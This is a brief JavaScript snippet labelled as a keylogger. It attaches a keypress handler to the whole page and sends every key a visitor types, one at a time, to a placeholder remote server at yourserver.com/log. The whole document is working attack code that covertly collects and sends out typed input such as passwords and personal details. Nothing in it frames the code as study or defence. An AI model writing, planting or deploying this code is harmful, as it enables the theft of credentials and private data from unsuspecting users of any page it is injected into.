//Keylogger in JavaScript
document.onkeypress = function(e) {
    var key = e.key;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://yourserver.com/log", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({key: key}));
}
